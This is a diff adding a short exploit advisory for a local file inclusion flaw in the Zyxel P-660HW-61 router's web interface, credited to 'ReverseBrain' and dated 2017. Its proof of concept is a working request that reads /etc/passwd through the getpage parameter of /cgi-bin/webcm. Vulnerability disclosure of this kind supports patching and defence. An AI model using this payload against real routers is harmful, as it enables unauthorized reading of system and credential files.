@@ -1,0 +1,19 @@
+# Exploit Title: Zyxel P-660HW-61 < 3.40(PE.11)C0 - Local File Inclusion
+# Date: 2-05-2017
+# Exploit Author: ReverseBrain
+# Contact: https://www.twitter.com/ReverseBrain
+# Vendor Homepage: https://www.zyxel.com
+# Software Link: ftp://ftp.zyxel.com/P-660HW-61/firmware/P-660HW-61_3.40(PE.11)C0.zip
+# Version: 3.40(PE.11)C0
+
+1. Description
+
+Any user who can login into the router can exploit the Local File Inclusion
+reading files stored inside the device.
+
+2. Proof of Concept
+
+Login into the router and use the path of a file you want to read as
+getpage parameter. For example:
+
+http://ROUTER_IP/cgi-bin/webcm?getpage=/etc/passwd
